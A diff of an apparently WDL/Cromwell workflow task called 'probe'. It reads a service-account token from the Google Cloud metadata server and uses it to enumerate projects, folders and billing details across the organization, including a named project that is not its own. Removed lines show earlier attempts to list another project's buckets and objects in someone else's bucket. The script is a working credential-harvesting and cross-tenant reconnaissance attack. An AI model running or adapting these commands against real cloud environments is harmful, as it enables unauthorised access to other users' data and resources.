@@ -10,30 +10,58 @@ task probe {
           "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
           | sed 's/.*"access_token":"\([^"]*\)".*/\1/')
 
-        echo "=== SA Email ===" > /mnt/disks/cromwell_root/results.txt
+        echo "=== SA Email ==="
         curl -sf -H "Metadata-Flavor: Google" \
-          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
-          >> /mnt/disks/cromwell_root/results.txt 2>&1
+          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
 
-        echo "" >> /mnt/disks/cromwell_root/results.txt
-        echo "=== Token first 30 chars ===" >> /mnt/disks/cromwell_root/results.txt
-        echo "$TOKEN" | head -c 30 >> /mnt/disks/cromwell_root/results.txt
-
-        echo "" >> /mnt/disks/cromwell_root/results.txt
-        echo "=== List buckets project wb-sparkly-turnip-3673 ===" >> /mnt/disks/cromwell_root/results.txt
+        echo ""
+        echo "=== List projects in org (resourcemanager) ==="
         curl -s -H "Authorization: Bearer $TOKEN" \
-          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673" >> /mnt/disks/cromwell_root/results.txt 2>&1
+          "https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.type%3Dorganization"
 
-        echo "" >> /mnt/disks/cromwell_root/results.txt
-        echo "=== List objects bucket-alecksey ===" >> /mnt/disks/cromwell_root/results.txt
+        echo ""
+        echo "=== List ALL projects visible to SA ==="
         curl -s -H "Authorization: Bearer $TOKEN" \
-          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o" >> /mnt/disks/cromwell_root/results.txt 2>&1
+          "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100"
 
-        echo "" >> /mnt/disks/cromwell_root/results.txt
-        echo "=== Token info ===" >> /mnt/disks/cromwell_root/results.txt
-        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" >> /mnt/disks/cromwell_root/results.txt 2>&1
+        echo ""
+        echo "=== List projects v3 ==="
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://cloudresourcemanager.googleapis.com/v3/projects?pageSize=100"
 
-        cat /mnt/disks/cromwell_root/results.txt
+        echo ""
+        echo "=== Search projects ==="
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://cloudresourcemanager.googleapis.com/v3/projects:search" \
+          -X POST -H "Content-Type: application/json" \
+          -d '{"pageSize":100}'
+
+        echo ""
+        echo "=== List folders ==="
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://cloudresourcemanager.googleapis.com/v3/folders:search" \
+          -X POST -H "Content-Type: application/json" \
+          -d '{"pageSize":100}'
+
+        echo ""
+        echo "=== Get own project ==="
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-shiny-pumpkin-9044"
+
+        echo ""
+        echo "=== Get other project ==="
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-sparkly-turnip-3673"
+
+        echo ""
+        echo "=== Billing info own project ==="
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://cloudbilling.googleapis.com/v1/projects/wb-shiny-pumpkin-9044/billingInfo"
+
+        echo ""
+        echo "=== Billing info other project ==="
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://cloudbilling.googleapis.com/v1/projects/wb-sparkly-turnip-3673/billingInfo"
     >>>
 
     runtime {
